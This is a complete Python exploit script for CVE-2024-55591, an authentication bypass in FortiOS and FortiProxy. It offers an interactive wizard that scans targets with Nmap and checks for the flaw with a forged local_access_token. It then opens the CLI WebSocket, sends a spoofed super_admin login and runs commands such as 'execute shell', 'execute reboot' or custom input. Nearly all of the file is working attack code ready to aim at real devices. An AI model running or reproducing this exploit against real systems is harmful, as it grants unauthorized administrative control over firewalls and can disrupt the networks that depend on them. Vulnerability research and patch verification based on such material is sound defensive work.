#!/usr/bin/env python3

"""
   PoC for CVE-2024-55591
  Affects:
    - FortiOS 7.0.0 to 7.0.16
    - FortiProxy 7.0.0 to 7.0.19
    - FortiProxy 7.2.0 to 7.2.12

  This script optionally runs an Nmap scan, checks if the target is likely
  a FortiOS/FortiProxy device, attempts to bypass auth (CVE-2024-55591),
  includes optional post-exploitation commands if successful, and inspects 
  the system version to see if it falls into any known vulnerable range.

  Based on findings from FG-IR-24-535:
      https://fortiguard.fortinet.com/psirt/FG-IR-24-535
"""

import sys
import subprocess
import importlib.util
import os
import shutil
import socket
import struct
import base64
import ssl
import re
import time

requests = None
urllib3 = None

################################################################################
# Dependency Handling
################################################################################

def is_package_installed(package_name):
    return importlib.util.find_spec(package_name) is not None

def check_and_install_dependencies(packages):
    install_results = {}
    for package in packages:
        if not is_package_installed(package):
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                install_results[package] = True
            except subprocess.CalledProcessError:
                install_results[package] = False
        else:
            install_results[package] = True
    return install_results

def import_dependencies():
    global requests, urllib3
    import requests as r
    import urllib3 as u
    requests = r
    urllib3 = u
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_requirements_table(install_map, nmap_installed):
    print("\n+---------------------------------------+")
    print("|         Dependency Check Table        |")
    print("+---------------------------------------+")
    for pkg, status in install_map.items():
        sign = "V" if status else "X"
        print(f"| {pkg.ljust(15)}  -->  [{sign}]            |")
    nm_sign = "V" if nmap_installed else "X"
    print(f"| nmap{' ' * 13}  -->  [{nm_sign}]            |")
    print("+---------------------------------------+\n")

################################################################################
# Wizard + Nmap
################################################################################

def wizard_prompt(prompt_text, default=None, validator=None):
    while True:
        if default is not None:
            user_input = input(f"{prompt_text} [{default}]: ").strip()
            if user_input == "" and default is not None:
                user_input = default
        else:
            user_input = input(f"{prompt_text}: ").strip()

        if validator:
            if validator(user_input):
                return user_input
            else:
                print("[!] Invalid input. Try again.")
        else:
            return user_input

def run_nmap_scan(host):
    if shutil.which("nmap") is None:
        return []
    print("[*] Running Nmap SYN scan. This may take time...")
    cmd = ["nmap", "-sS", "-p-", "--min-rate", "500", host]
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, universal_newlines=True)
    except subprocess.CalledProcessError:
        return []
    open_ports = []
    for line in output.splitlines():
        if "/tcp" in line and " open " in line:
            try:
                port_part = line.split("/tcp")[0].strip()
                open_ports.append(int(port_part))
            except:
                pass
    return sorted(open_ports)

def select_command():
    commands = [
        "get system info",
        "get system status",
        "diag sys top",
        "diag debug crashlog read",
        "execute reboot",
        "Custom"
    ]
    print("\nSelect the INITIAL command to run after exploit:")
    for i, cmd in enumerate(commands, start=1):
        print(f" {i}) {cmd}")
    while True:
        choice = input("Your choice [1-6]: ").strip()
        if choice.isdigit():
            c = int(choice)
            if 1 <= c <= 6:
                break
        print("[!] Invalid choice.")
    if c == 6:
        return wizard_prompt("Enter custom command")
    return commands[c - 1]

def wizard_mode():
    print("\nScaryByte R&D PoC for CVE-2024-55591\n")
    host = wizard_prompt("Target IP or hostname", validator=lambda x: len(x) > 0)
    scan_choice = wizard_prompt("Run Nmap SYN scan for all ports? (y/n)", default="y").lower()
    open_ports = []
    if scan_choice.startswith("y"):
        open_ports = run_nmap_scan(host)
        if open_ports:
            print(f"[+] Open ports: {open_ports}")
        else:
            print("[!] No open ports found or Nmap error.")
    ssl_choice = wizard_prompt("Use SSL? (y/n)", default="y").lower()
    use_ssl = ssl_choice.startswith("y")
    cmd = select_command()
    user = wizard_prompt("Username for exploitation", default="ScaryByte")

    # We also let user pick if we do post-exploit commands
    do_post_exploit = wizard_prompt("Run additional POST-exploit commands if initial command succeeds? (y/n)",
                                    default="n").lower().startswith("y")

    if open_ports:
        if len(open_ports) > 1:
            test_all_choice = wizard_prompt(
                "Multiple open ports found. Test ALL? (y/n)",
                default="n"
            ).lower()
            if test_all_choice == "y":
                return host, open_ports, use_ssl, user, cmd, True, do_post_exploit

        port_str = wizard_prompt("Choose or enter a port",
                                 default=str(open_ports[0]),
                                 validator=lambda x: x.isdigit())
        port = int(port_str)
        return host, [port], use_ssl, user, cmd, False, do_post_exploit
    else:
        port_str = wizard_prompt("Port", default="443", validator=lambda x: x.isdigit())
        port = int(port_str)
        return host, [port], use_ssl, user, cmd, False, do_post_exploit

################################################################################
# WebSocket & Exploit
################################################################################

def create_websocket_frame(message, is_binary=False):
    data = message if isinstance(message, bytes) else message.encode()
    length = len(data)
    mask_key = os.urandom(4)
    frame = bytearray([0x82 if is_binary else 0x81])
    if length < 126:
        frame.append(length | 0x80)
    elif length < 65536:
        frame.append(126 | 0x80)
        frame.extend(struct.pack('>H', length))
    else:
        frame.append(127 | 0x80)
        frame.extend(struct.pack('>Q', length))
    frame.extend(mask_key)
    masked_data = bytearray(length)
    for i in range(length):
        masked_data[i] = data[i] ^ mask_key[i % 4]
    frame.extend(masked_data)
    return frame

def decode_websocket_frame(data):
    if len(data) < 2:
        return None, None
    fin_and_opcode = data[0]
    opcode = fin_and_opcode & 0x0F
    payload_len = data[1] & 0x7F
    offset = 2
    if payload_len == 126:
        if len(data) < 4:
            return None, None
        payload_len = struct.unpack('>H', data[2:4])[0]
        offset = 4
    elif payload_len == 127:
        if len(data) < 10:
            return None, None
        payload_len = struct.unpack('>Q', data[2:10])[0]
        offset = 10
    if len(data) < offset + 4:
        return None, None
    mask_key = data[offset:offset + 4]
    offset += 4
    if len(data) < offset + payload_len:
        return None, None
    payload = data[offset:offset + payload_len]
    payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
    return opcode, payload

def send_command(sock, cmd):
    message = f"\r\n{cmd}\r\n"
    sock.send(create_websocket_frame(message))

def send_login_context(sock, user):
    login_message = (f'"{user}" "admin" "SomeFakePass" "super_admin" '
                     f'"SomeFakePass" "SomeFakePass" [13.37.13.37]:1337 [13.37.13.37]:1337\r\n')
    sock.send(create_websocket_frame(login_message))

################################################################################
# Version Parsing
################################################################################

def parse_forti_version_from_output(output):
    pattern = r"(FortiOS|FortiProxy)\s+v(\d+)\.(\d+)\.(\d+)"
    regex = re.compile(pattern, re.IGNORECASE)
    for line in output.splitlines():
        match = regex.search(line)
        if match:
            product = match.group(1)
            major = int(match.group(2))
            minor = int(match.group(3))
            patch = int(match.group(4))
            return product, major, minor, patch
    return None

def check_if_version_vulnerable(product, major, minor, patch):
    # FortiOS 7.0.0 <= version <= 7.0.16
    # FortiProxy 7.0.0 <= version <= 7.0.19
    # FortiProxy 7.2.0 <= version <= 7.2.12
    if product.lower() == "fortios":
        if major == 7 and minor == 0 and patch <= 16:
            return True
        return False
    else:
        if major == 7 and minor == 0 and patch <= 19:
            return True
        if major == 7 and minor == 2 and patch <= 12:
            return True
        return False

################################################################################
# Telnet Session & Post-Exploitation
################################################################################

def post_exploit_actions(sock, output_buffer):
    # Some additional commands we might want to run:
    # You can customize or add more. We'll just demonstrate:
    commands = [
        "diag sys top",
        "diag debug crashlog read",
        "execute shell"
    ]
    print("\n[*] Running post-exploit commands...\n")
    for cmd in commands:
        print(f"[*] Sending post-exploit command: {cmd}")
        send_command(sock, cmd)
        time.sleep(1)  # small delay, can be adjusted
        # We'll rely on the same reading loop to capture output,
        # appended to output_buffer. The main loop is still reading from the socket.

def initialize_telnet_session(sock, user, initial_cmd, do_post_exploit=False):
    combined_output = []
    stage = "login"
    keep_reading = True
    while keep_reading:
        try:
            data = sock.recv(4096)
            if not data:
                break
            opcode, payload = decode_websocket_frame(data)
            # Attempt raw decode for printing
            readable = None
            try:
                readable = bytes.fromhex(data.hex()).decode(errors='replace')
            except:
                pass
            if readable and len(readable) > 5:
                combined_output.append(readable)
                print(f"[+] Server Output:\n{readable}")
            if opcode == 0x8:
                print("[*] Server closed connection.")
                break
            elif opcode in [0x1, 0x2] and payload:
                decoded_message = payload.decode(errors='replace')
                if decoded_message.strip():
                    combined_output.append(decoded_message)
                    # Print it out
                    print(f"[+] Server Output:\n{decoded_message}")

                    if stage == "login":
                        # we've just sent login context, so now let's send the initial command
                        stage = "initial_cmd"
                        send_command(sock, initial_cmd)
                    elif stage == "initial_cmd":
                        # we got some output from that command
                        if do_post_exploit:
                            stage = "post_exploit"
                            post_exploit_actions(sock, combined_output)
                        else:
                            stage = "done"
                    elif stage == "post_exploit":
                        # We've presumably gotten output from each post-exploit command
                        # We'll keep reading until we sense we might be done or the server closes
                        # Let's break after a short time
                        stage = "done"
                    elif stage == "done":
                        # all done
                        pass

        except ConnectionResetError:
            print("[-] Connection reset by peer.")
            break
        except Exception as e:
            print(f"[-] Telnet session error: {e}")
            break
    return "\n".join(combined_output)

################################################################################
# Pre-Flight and Connection
################################################################################

def pre_flight_checks(host, port, use_ssl):
    if use_ssl:
        url = f"https://{host}:{port}"
    else:
        url = f"http://{host}:{port}"
    try:
        r = requests.get(url + "/login?redir=/ng", verify=False, timeout=10)
        if '<html class="main-app">' not in r.text:
            print(f"[!] Not a valid FortiOS mgmt interface on port {port}.")
            return False
        else:
            print(f"[+] Detected FortiOS/FortiProxy mgmt interface on port {port}.")
    except Exception as e:
        print(f"[-] Error connecting to {url}: {e}")
        return False

    try:
        r2 = requests.get(url + "/service-worker.js?local_access_token=ScaryBYte",
                          verify=False, timeout=10)
        if "api/v2/static" not in r2.text:
            print(f"[!] Port {port} does NOT appear vulnerable to CVE-2024-55591.")
            return False
        else:
            print(f"[+] Port {port} appears vulnerable to CVE-2024-55591.")
    except Exception as e:
        print(f"[-] Error checking vulnerability on port {port}: {e}")
        return False
    return True

def ws_connect_and_initialize(host, port, use_ssl, user, initial_cmd, do_post_exploit):
    success = False
    output_captured = ""
    while True:
        try:
            ws_key = base64.b64encode(os.urandom(16)).decode()
            upgrade_request = (
                f"GET /ws/cli/open?cols=162&rows=100&local_access_token=ScaryBYte HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {ws_key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n\r\n"
            )
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=host)
            print(f"[*] Connecting to {host}:{port} via {'SSL' if use_ssl else 'plaintext'}...")
            s.connect((host, port))
            s.send(upgrade_request.encode())
            response = s.recv(4096)
            if b"101 Switching Protocols" not in response:
                print(f"[-] Port {port} did not switch to WebSocket properly.")
                s.close()
                break
            print("[+] WebSocket upgraded. Sending exploit login context...")
            send_login_context(s, user)
            output_captured = initialize_telnet_session(s, user, initial_cmd, do_post_exploit)
            s.close()

            # If we got here, we tried the exploit. We'll consider it "success" if there's any meaningful output.
            if output_captured and len(output_captured) > 20:
                success = True
            break
        except ConnectionResetError:
            print("[-] Connection reset. Retrying...")
        except Exception as e:
            print(f"[-] WebSocket setup error on port {port}: {e}")
            break
    return success, output_captured

################################################################################
# Main
################################################################################

def main():
    print("""
         ScaryByte R&D PoC for CVE-2024-55591
         Versions Affected:
           - FortiOS 7.0.0 to 7.0.16
           - FortiProxy 7.0.0 to 7.0.19
           - FortiProxy 7.2.0 to 7.2.12
    """)
    install_map = check_and_install_dependencies(["requests", "urllib3"])
    import_dependencies()
    nmap_installed = shutil.which("nmap") is not None
    print_requirements_table(install_map, nmap_installed)

    try:
        host, port_list, use_ssl, user, command, test_all, do_post_exploit = wizard_mode()

        if test_all:
            print(f"\n[!] Testing ALL discovered open ports on {host}...\n")
            for p in port_list:
                print(f"\n--- Testing Port {p} ---")
                if not pre_flight_checks(host, p, use_ssl):
                    print(f"[-] Skipping port {p}, not vulnerable / not responding.\n")
                    continue
                success, output = ws_connect_and_initialize(host, p, use_ssl, user, command, do_post_exploit)
                if success:
                    print(f"[!] Exploit attempt on port {p} completed. Check output above.\n")
                    # Attempt version parse
                    version_info = parse_forti_version_from_output(output)
                    if version_info:
                        product, maj, mn, patch = version_info
                        print(f"    Detected version: {product} v{maj}.{mn}.{patch}")
                        vulnerable = check_if_version_vulnerable(product, maj, mn, patch)
                        if vulnerable:
                            print("    [!] This version falls within the known vulnerable range!")
                        else:
                            print("    [!] This version appears out-of-range (possibly patched).")
                else:
                    print(f"[-] Exploit attempt on port {p} did NOT succeed.\n")
        else:
            p = port_list[0]
            if pre_flight_checks(host, p, use_ssl):
                success, output = ws_connect_and_initialize(host, p, use_ssl, user, command, do_post_exploit)
                if success:
                    print(f"[!] Exploit attempt on port {p} completed. Check output above.\n")
                    version_info = parse_forti_version_from_output(output)
                    if version_info:
                        product, maj, mn, patch = version_info
                        print(f"    Detected version: {product} v{maj}.{mn}.{patch}")
                        if check_if_version_vulnerable(product, maj, mn, patch):
                            print("    [!] This version falls within the known vulnerable range!")
                        else:
                            print("    [!] This version appears out-of-range (possibly patched).")
                else:
                    print(f"[-] Exploit attempt on port {p} did NOT succeed.\n")
            else:
                print(f"[-] Pre-flight checks failed on port {p}. No further attempts.")

        print("\n[!] Exploit attempts complete.")
        print("    Refer to the server output above for session results or errors.\n")
        print("Check FG-IR-24-535 for official statements and patch information:\n"
              "  https://fortiguard.fortinet.com/psirt/FG-IR-24-535\n")

        print("If you saw an interactive shell or command output, the system is likely unpatched.\n"
              "If the system didn't respond or forcibly closed connections, it may already be patched.\n")
    except KeyboardInterrupt:
        print("[*] Interrupted by user.")
    except Exception as e:
        print(f"[-] Fatal error: {e}")

if __name__ == "__main__":
    main()
